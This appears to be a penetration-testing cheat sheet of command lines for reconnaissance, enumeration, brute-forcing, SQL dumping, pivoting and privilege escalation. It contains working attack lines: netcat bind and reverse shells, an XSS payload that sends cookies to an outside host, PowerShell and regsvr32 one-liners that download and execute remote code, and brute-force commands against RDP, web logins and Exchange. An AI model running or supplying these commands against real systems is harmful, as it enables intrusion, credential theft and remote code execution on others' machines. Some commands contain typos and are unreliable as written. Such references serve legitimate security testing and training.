# Offensive security/penetration testing:

## Tools needed:
Enum4linux:  `git clone -v https://github.com/portcullislabs/enum4linux /opt/enum4linux-git`\
Nullinux:    `git clone -v https://github.com/m8r0wn/nullinux /opt/nullinux-git`\
Install UserEnum_LDAP: `git clone -v https://github.com/sensepost/UserEnum /opt/UserEnum_LDAP-git`\
OWA Toolkit EWS Brute: `git clone -v https://github.com/johnnyDEP/OWA-Toolkit /opt/OWA-Toolkit-git`\
MailSniper: `git clone -v https://github.com/dafthack/MailSniper /opt/MailSniper-git`\
Sherlock: `git clone -v https://github.com/rasta-mouse/Watson /opt/Watson-git`

## Linux commands:

Export the IP of the target to a bash variable: `export ip=192.168.1.100`\
Ping the target: `ping $IP`\
Find the location of a file: `locate `\
Use the $PATH environment variable to find a file: `which hydra`\
Use the $PATH and $MANPATH environment variable to find a file: `whereis more`\
Show only listening sockets with info: `netstat -tunlap`\
Start/stop a service such as ssh: `systemctl {start|stop} ssh`\
Have a service start at boot: `systemctl enable ssh`\
Unzip a tar'd gzip file: `tar -xzvf file.tar.gz` (bzip: -j, xz: -J, --lzip, --lzma, --lzop, Zip/Gzip: -z, Compress: -Z)\
Search bash command history: `history | grep {condition}`\
Use a bash loop to find the IP address behind each host:`for url in $(cat list.txt); do host $url; done`\
Base64 decode linux: `echo -n "ZGVjb2RlIHRoaXM=" | base64 -d`\
Decode Hexidecimal Encoded string: `echo -n "54 68 6973206973206120 68657820 656E636F 64656420 7374 7269 6E 67" | xxd -r -ps`\
Mount NFS Share: `Mount -t nfs 10.10.10.45:/vol/nfsshare /mnt/nfs`\
Example bash stuff: `cat access.log | cut -d " " -f 1 | sort | uniq -c | wc -l`

## Windows/CMD commands:
Export the IP of the target to a Windows variables: `set IP=192.168.1.100`\
Ping the target: `ping %IP%`\
System information: `systeminfo`\
Get Windows updates:`dism /online /get-packages`\
Wmic get updates: `wmic qfe list full /format:htable > hotfixes.htm`\
In PSH: `Get-WmiObject -Class "win32_quickfixengineering" | Select-Object -Property "Description", "HotfixID", @{Name="InstalledOn"; Expression={([DateTime]($_.InstalledOn)).ToLocalTime()}}`\
Find files: `dir c: /S /OD /TC`\
Find files PSH: `gci -filter * -recurse`

### Finding files/data:

Find UID 0 files root execution: `find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`\
Linux enum: `wget https://highon.coffee/downloads/linux-local-enum.sh; chmod +x ./linux-local-enum.sh; ./linux-local-enum.sh`\
Find executable files updated in Jan: `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Jan`\
Find a specific file on linux: `find /. -name suid\*`\
Files modified in the last 90 days: `find -type f -mtime -90` \
Files modified 90 days ago: `find -type f -mtime 90` \
Files modified around 3 months ago: `find -type f -mtime 75 +mtime 105` \
String in a file: `strings $file`\
File type info: `file $file`\
Exif information: `exiftool $file`\
Search for other files/magic info in a file: `binwalk $file`\
Extract data from a file: `bulk_extractor $file -O {output dir}`\
Install steghide: `apt-get install steghide`\
Extract data with steghide: `steghide extract -sf picture.jpg`

### Netcat/nc # nc.traditional or nc?

Bind shell listener: `nc.exe -nlvp 443 -e cmd.exe`\
Reverse shell listener: `nc -nv $ip 443 -e /bin/bash`\
Connect to a SMTP mail server: `nc -nv $ip 25`\
Listen on TCP port: `nc -nlvp 443`\
Connect to NC listener: `nc -nv $ip 43`\
Send a file: `nc -nv $IP 443 < outgoing-data`\
Receive a file: `nc -nlvp 443 > incoming-data`

## Traffic dumping and Packet captures

### Wireshark:

Filter for SMTP traffic: `tcp.port eq 25`\
ICMP only: `icmp`\
DNS only: `dns`\
SIP only: `sip`\
Specific windows stuff: `smb || nbns || dcerpc || nbss || dns`
MAC address filter slicing: `eth.addr[0:3] == 00:50:56`\
Negate traffic for this host: `!(ip.addr == 192.168.0.1)`\
HTTP Post only traffic: `http.request.method == post`

### Tcpdump:

Replay a pcap file: `tcpdump -r filename.pcap`\
Grab a packet capture on port 80: `tcpdump  -i ens0 -xxNNSs 1514 -w output.pcap`

## IPtables

### Flush, delete, accept all traffic:

`sudo iptables -P INPUT ACCEPT`\
`sudo iptables -P FORWARD ACCEPT`\
`sudo iptables -P OUTPUT ACCEPT`\
`sudo iptables -t nat -F`\
`sudo iptables -t mangle -F`\
`sudo iptables -F`\
`sudo iptables -X`

Just flush:     `iptables -F`\
Clear counters: `iptables -Z`

## Information discovery

### Passive:

Google search subdomains: `site:microsoft.com`\
Google operators: inurl, intitle\
Shodan.io\
Censys.io\
Google - https://www.exploit-db.com/google-hacking-database/ \
Netcraft\
Whois:`./whois`\
Online Certificate checking: `http://crt.sh`

### Active:

Email address harvesting: `cewl -e www.microsoft.com`

#### DNS:

DNS host discovery search: `Fierce.pl`\
Brute force DNS: `python ./subbrute.py ./all.txt domain.com | /massdns -r resolvers.txt -t A -a -o -w domain.com.txt -`\
Fierce.pl\
Zone xfer: `dnsrecon -d megacorpone.com -t axfr` or `dig axfr my-domain.com @ns1.my-domain.com`\
DNS resolution: `dig` or `host`\
DNS resolution Windows: `nslookup`,`set type=1`,`use servername`,`ls -a`\
List canonical names and aliases or `ls -d` all records or `-t A` list records type A,CNAME,MX,NS,PTR\
Nmap DNS: `nmap $dnsserver --script dns-fuzz --script-args timelimit=2h`

#### Host recon:

Initial host discovery (Ping scan): `nmap -sn -r 10.10.12.0/24  | grep 'Nmap scan report' | cut -d' ' -f 5 > live_hosts.txt`\

Useful options:\
`-sP` Ping scan for hosts, no port scan\
`-PS` `-PA` `-PU` Host discovery using TCP Syn, TCP Ack, and UDP.\
`-PO` Scan Host discovery using IP Protocol

#### Port Scanning:

Initial TCP Port scan: `nmap -sT -vv -p- $IP -oA tcp-port-scan`\
TCP Port scan: `nmap -sV -sC -vv -p- $IP -oA tcp-port-scan`\

Thorough TCP/UDP: `Nmap -sS -sU -v -p1-65535 $IP`\
TCP with OS discovery (-O), service scanning (-sV), script scanning (-sC), traceroute( --traceroute), Import hosts to scan(-iL)
`nmap -n -vvvv -sT -p0-65535 -A -iL live_host.txt -oA nmap_tcp_scan`\
`nmap -n -vvvv -Pn -sU -F -iL live_host.txt -oA nmap_udp_scan`

Useful options:

`-sS`: Stealth scan, uses TCP Syn only\
`-sT`: Full TCP scan using Syn/Ack\
`--open`: Only shows open ports\
`--reason`: Reason for port state\
`--badsum`: Useful for detecting FW/IDS\
`-Pn`: skip host discovery\
`-sA`: Check if ports a filtered by FW, doesn’t determine open ports\
`-6`: IPV6\
`--packet-trace`: Show all packets sent and received\
`-T1-5`: speed

Using NC for port scans:`nc -nvv -w 1 -z $IP 3388-3390`

#### Scripts:

Categories: `auth, broadcast, default, discovery, safe, version` \
`dos, exploit, external, fuzzer, intrusive, malware, vuln`\
Update scripts: `--script-updatedb`
Default: `-sC`
Vulnerability: `--script vuln`
Categories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln
Example: `nmap --script "default and safe"`\
RPC scripts: `nmap --script="rpc*" 10.10.10.33`\

#### Searchsploit

Copy the sploit to current folder: `searchsploit -m [sploit to copy]`\
Update searchsploit: `searchsploit -u`\

# Infrastructure hacking

## Windows Enumeration process:

SMB Enumeration: `nullinux -all -U 'domain\username' -P password $IP`\
SMB Browse: `smbclient //$IP/Users -U username`\
Linux Mount SMB: `mount -t cifs -o username=user,password=pass,domain=domain //$IP/share /mnt`\
RPCClient authenticated scan: `rpcclient --user="<Username>" --command=enumprivs $IP`\
SMB Nmap authenticated scan: `nmap -sV -Pn -vv -p445 $IP --script-args smbuser={},smbpass={} --script='(smb*) and safe ' `\
SMB Nmap authenticates open: `nmap -p445 192.168.10.0/24 -v --script smb-enum-shares --script-args smbuser={},smbpass={}   -oA nmap-auth-shares`\
SMB Nmap enumerate users: `nmap -sU -sS --script=smb-enum-users -p U:137,T:$IP -oA nmap-enum-users`\
Rid cycling: `ridenum.py $IP 500 50000 dict.txt`\
Metasploit DCOM enumeration: `use auxiliary/scanner/dcerpc/endpoint_mapper`\
Metasploit Hidden DCOM enumeration: `use auxiliary/scanner/dcerpc/hidden`\
Metasploit Management DCOM enumeration: `use auxiliary/scanner/dcerpc/management`\
Netbios enumeration: `nbtscan -r 10.10.10.0/24`\
Netbios enumeration with Nmap: `nmap -sU --script nbstat.nse -p 137 $IP`

# Infrastructure testing

### Test SSL:

Enumerate SSL/TLS: `testssl --headers --vulnerable --log --html www.google.co.uk:443`\
Enumerate SSL/TLS: `SSLScan 10.10.10.9:443`

### FTP TCP/21:

### SMTP TCP/25:

Metasploit: `auxiliary/scanner/smtp/smtp_enum`\
NMap: `nmap 10.10.10.9 –script smtp-enum-users.nse -oA nmap-smtp-user-enum`

### DNS TCP-UDP/53:

Bruteforce hosts and subdomains: `use auxiliary/gather/dns_bruteforce`\
DNS info: `use auxiliary/gather/dns_info`\
Reverse lookup information: `use auxiliary/gather/dns_reverse_lookup`\
Bruteforce hosts, subdomains: `Fierce.pl`\
DNS Ampliflication test: `use auxiliary/scanner/dns/dns_amp`\
Cache scraper: `use auxiliary/gather/dns_cache_scraper`\
Nmap DNS scripts: `nmap -sTU -p53 $IP --script "dns*"`

### Finger TCP/79:

Enumerate user using Finger: `finger -sl username@$IP`

### POP3 TCP/110:

Telnet to SMTP server: `telnet {ip} {port}`\
Commands: user, pass, list, retr

### NFS TCP/UDP/111

Show exported mounts: `showmoints -e $ip`

### Netbios TCP/135/138/139:

Netbios Windows User enumeration (SensePost-UserEnum_NBS): `UserEnum_NBS.py 10.10.16.202 10.10.10.4 Contoso userslist.txt`\
RPC Windows User enumeration (SensePost-UserEnum_NBS):`UserEnum_RPC.py 10.10.10.4 userslist.txt`\
Impacket RPCDump: `rpcdump.py $IP`

### SNMP TCP/161:

Fix output values: `apt-get install snmp-mibs-downloader download-mibs echo "" > /etc/snmp/snmp.conf`\
Enumerate with SNMP Check Public v2c: `snmp-check $ip -p161 -c public -v 2c`\
Enumerate with SNMP Check default: `snmp-check $ip`\
Enuerate with Snmpenum: `snmpenum $ip public windows.txt`\
Nmap SNMP scripts: `nmap -sU $ip -p161 -Pn --script "snmp*" `\
Brute force with OneSixtyOne:`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $ip`\
SNMP Creds: `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`

### Micrsoft RPC/Endpoint mapper:

Metasploit Endpoint_mapper: `use auxiliary/scanner/dcerpc/endpoint_mapper`,`auxiliary/scanner/dcerpc/hidden`,`auxiliary/scanner/dcerpc/management`,`auxiliary/scanner/dcerpc/tcp_dcerpc_auditor`\

### LDAP TCP/389-636:
LDAP Windows User enumeration (SensePost-UserEnum): `UserEnum_LDAP.py $IP Contoso.local userslist.txt`
LDAPSearch rootDSE query to get namingContext(no bind): `ldapsearch -x -h $IP -b '' -s base '(objectclass=*)' | grep namingContexts`\
LDAPSearch for all objects (anonymous): `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D '' -w '' '(objectclass=*)'
`\
LDAPSearch for all object (bind connection): `ldapsearch -x -h $IP -b 'dc=domain,dc=local' -D 'username' -w 'password' '(objectclass=*)'
`
### RSH TCP/514:

Metasploit: `auxiliary/scanner/rservices/rsh_login`

### HTTP/HTTPS TCP/80/443:

Nmap -sV --script=http-enum --script-args http-enum.basepath=server/ -v 192.168.0.33\
Nikto -h $ip\
OpenVAS\
HTTP Methods: `nmap $ip -p80,443 -script http-methods --script-args http-methods.url-path='/server' -oA http-methods `\
HTTP options: `curl -vX OPTIONS http://10.10.10.59/`\
Shellshock: `git clone https://github.com/nccgroup/shocker`\
HTTP Put: `nmap --script http-put --script-args http-put.url='',http-put.file=''`\
HTTP Move:`curl -X Move --header`\
HTTP Move: Metasploit: `exploit/windows/iis/iis_webdav_upload_asp`\
XSS iframe test: `<iframe src="http://malicious-url/content" height="0" width="0"></iframe>`\
XSS steal cookies: `<script>new image().src="http://192.168.0.1/submission.php?stolen_data="+document.cookie;</script>`\
LFI/RFI Enumeration: `https://github.com/kurobeats/fimap`\
LFI/PHP filter: `curl -s http://vulnerale-page/?page=php://filter/convert.base64-encode/resource=index | base64 -d`\
PHPinfo exploit: `https://github.com/kurobeats/fimap/wiki/FimapPhpInfoExploit`\
LFI: `http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf`\
Exchange tools: `Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://owa.domain.com/EWS/Exchange.asmx" -Password "omg123" -Domain "domain.com"`\
HTTP Brute force (Simple post): `hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/login:username=^USER^&password=^PASS^&submit=Login:F=failed' -t 40
`\
Apache Tomcat Manager: `hydra -L tomcat-users.txt -P rockyou.txt -f $IP http-get /manager/html`

### SQL TCP/1433:

NMAP Enumeration: `nmap 10.10.10.59 -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER`\
SQLMap Enumeration: `sqlmap -R`\
SqlNinja\
MSDat - Micrsoft Database Attacking Tool: `https://github.com/quentinhardy/msdat`

### Oracle
odat standaline tool: `https://github.com/quentinhardy/odat/releases/download/2.2.1/odat-linux-libc2.5-i686.tar.gz`

### MySQL/3306:
Fingerpring (-f) SQL with SQLMap: `sqlmap -r request.txt -f`\
Dump databases (--dbs) SQL with SQLMap: `sqlmap -r request.txt -D mysql --dbs --dump`\
Dump tables in DB (--db test --tables) SQL with SQLMap: `sqlmap -r request.txt -D mysql --D test --tables --dump`

### RDP/3389
Enumeration: `nmap -A --script=vuln -p3389 --script="rdp*" -v`
Bruteforce: `ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP`

### Check file extensions:

ASP Classic: `asp`\
ASP.NET: `aspx,axd,asx,asmx,ashx`\
All IIS: `asax,ascx,ashx,asmx,aspx,axd,browser,cd,compile,config,cs,vb,csproj,vbproj,disco,vsdisco,dsdgm,dsprototype,dll,licx,webinfo,master,mdb,ldb,mdf,msgx,svc,resrouce,resx,sdm,sdmDocument,sitemap,skin,sln,soap,asa,imDitto,cdx,cer,idc,shtm,shtm,stm,css,htm,html`\
CSS: `css`\
Coldfusion: `cfm`\
Erlang: `yaws`\
Flash: `swf`\
HTML: `html,htm,xhtml,jhtml`\
Java/Tomcat: `jsp,jspx,wss,do,action`\
JavaScript: `js`\
Perl: `pl`\
`PHP,php,php4,php3,phtml`\
Python: `py`\
Ruby: `rb,rhtml`\
SSI: `shtml`\
XML: `xml, rss, svg`\
Other (C, perl etc.): `cgi, dll`\
Random: `txt, bak, un~`

### Check http response codes: 200,204,301,302,307,403

#### HTTP directory enumeration:
GoBuster Directory enumeration: `gobuster -u $IP -w $wordlist -e -s 200,204,301,302,307,403,500`\
GoBuster Directory Appened forward-slash enumeration: `gobuster -u $IP -w wordlist.txt -l -e -s 200,204,301,302,307,403,500 -t 30`\
GoBuster File ext (-x) enumeration: `gobuster -u $IP -x PHP -w wordlist.txt -l -e -s 200,204,301,302,307,403,500 -t 30`\
GoBuster options: `-t add slashes, -l length, -e extended URL, -s codes, -t threads`\
Dirb through a proxy: `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`

### Wordlists:

/usr/share/seclists/Discovery/Web_Content/big.txt:20469\
/usr/share/seclists/Discovery/Web_Content/common.txt:4614\
/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt:8930\
/usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt:10355\
/usr/share/wordlists/dirbuster/directories.jbrofuzz:58688\
/usr/share/wordlists/dirbuster/directory-list-1.0.txt:141708\
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:220560\
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:87664\
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt:207643\
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt:81643

### Generating Password lists:

CeWL\
CUPP - Common user profiling\
Crunch - Wordlist generator\
KWProcessor - Keyboard walks

### Fuzzing:

`wfuzz - The web brute forcer`\

Cookie fuzzer: `wfuzz -c --hs incorrect -z file,/usr/share/wordlists/wfuzz/general/medium.txt -H "Cookie: password=FUZZ" http://$IP`\
HTTP GET Parameter fuzzer: `wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt http://$IP/?FUZZ=test`\
Subdomain fuzzing: `wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404,400,301 -u https://hostname.server -H "Host: FUZZ.hostname.server" `

### Sharepoint enum:

https://github.com/toddsiegel/spscan\
https://github.com/0rigen/SharePwn

### WordPress:

Wordpress scan: `WPScan -u http://10.10.10.59 --enumerate -u,t,at,ap --proxy 127.0.0.1:3129`

### .git:

GiTtools: `https://github.com/internetwache/GitTools`\
Dump git site: `./gitdumper.sh http://10.10.10.178/.git/ .git`\
Extract: `./extractor.sh ../../.git ../../git-dest-dir`

#### Python FTP:

`pip install pyftpdlib`\
`python -m pyftpdlib -p 21 -w`

#### Python Webserver:

`python3 -m http.server 80`\
`python2 -m SimpleHTTPServer 80`

#### PHP Server:

`php -s ip_address:80`\

#### SMB Server Linux

Impacket: `python smbserver.py shared /root/Desktop/repo`

### Windows Clients

PSH: `(new-object System.Net.WebClient).DownloadFile('http://10.10.16.33/shell.exe','C:\windows\temp\shell.exe')`

## Powershell:

powershell.exe -File file.ps1\
Powershell.exe -c 'code to execute’

Options:

-ExecutionPolicy Bypass\
-NoLogo\
-NonInteractive\
-NoProfile\
-NoExit


## Android APK:

Monitor log file: `pidcat $appname`\

Decompile the APK: `Apktool -d compiled-file.apk`\
Or use JADX UI (Easier to decode the Java)\
Or use Unzip\

Recompile the APK:`Apktool b decompiled-apk/ -o compiled-unsigned.apk`\
Aligning to 4bytes: `zipalign -v 4 compiled-unsigned.apk compiled-signed.apk`\

ADB stuff:\
`adb shell pm list packages`\
`adb shell pm path com.filename`\
`adb pull /data/app/filename/base.apk`\
`adb uninstall com.example.android`\
`adb install compiled-signed.apk`\

Signing the APK: `TO DO`

## SSH/SCP

### SSH

Connect (passwor): `ssh user@host`\
Local Port Forwarding (Maps port 80 on the localhost to port 80 on the remote host: ssh -L 80:target.host:80 pivot-host.com\
Local Port Forwarding (Maps port 80 on a differen ip to port 80 on the remote host: ssh -L 127.0.0.1:80:target.host:80 pivot-host.com\
Remote Port Forwarding (Maps port 80 on the remote host to the localhost port 8080, exposing localhost): ssh -R 8080:localhost:80 target-host.com\
Remote Port forwarding requires sshd_config changes: GatewayPorts yes, GatewayPorts clientspecified\
Example exposing a backdoor into the network: `ssh -R 2222:alternate-internal-host:22 -R 5432:alternate-internal-host:5432 external.host`\
SSH Control escape: `~C`\
Then commands: `-L 8080:localhost:80`\

### SCP

Copy a single file from local to remote: `scp ~/users.txt user@remote-host.com:~/userlist`\
Copy a single file from remote to local: `scp user@remote-host.com:~/userlist/users.txt ~/userlist`\
Copy a directory from local to remote (-r recursive): `scp -r ~/userlist user@remote-host.com:~/userlist`\
Copy a directory from remote to local (-r recursive): `scp -r user@remote-host.com:~/revenge ~/userlist`\
Copy from one ssh host to another ssh host (not yours): ` scp user@remote-host.com:~/users.txt user@another-remote-host.com:~/userlist`\

## Shells

### Web
Webshells http://tools.kali.org/maintaining-access/webshells: `Kali webshells: /usr/share/webshells`
Weevely

### Executables
Backdoor factory

## Port forwarding/masquerading

SOCAT: `socat TCP-LISTEN:80,fork TCP:192.168.1.1:80`\
IPTables: `iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT –to 192.168.1.1:80'

## Pivoting

### SSH with Proxychains

Setup a dynamic local SOCKS proxy: `ssh -fN -D 127.0.0.1:8888 user@target-host.com`\
Config file: eg `pivot.conf`\
`strict_chain # Do each connection via the proxies listed in order, alts: dynamic_chain, random_chain`\
`quiet_mode # No output`\
`proxy_dns # Proxy DNS requests`\
`remote_dns_subnet 224`\
`tcp_read_time_out 15000`\
`tcp_connect_time_out 8000`\
`localnet 127.0.0.0/255.0.0.0 # Exclusions`
 
`[ProxyList]`\
`socks4  127.0.0.1 8888`

Usage: `proxychains4 -f ./pivot.conf wget http://remote-network-target-host.com`\
DNS Resolution: `proxyresolv www.target-host.com`\
Specify alternate configuration:`-f`

### Netsh pivot
on the compromised host: `netsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.44`

### PLink on Windows

## One liners
Powershell: `powershell -w hidden -c "[System.Net.SystemPointManager]::ServerCertificateValidationCallback = { $true }; IEX ((new-object net.webclient).downloadstring('https://target/tools'))"`\
PowerShell IWR: `powershell.exe –c “IEX (Invoke-WebRequest -SkipCertificateCheck -Method 'GET' -Uri 'https://target/tools')`\
RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`\


# Privesc

## Windows
https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md#discovery\
Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
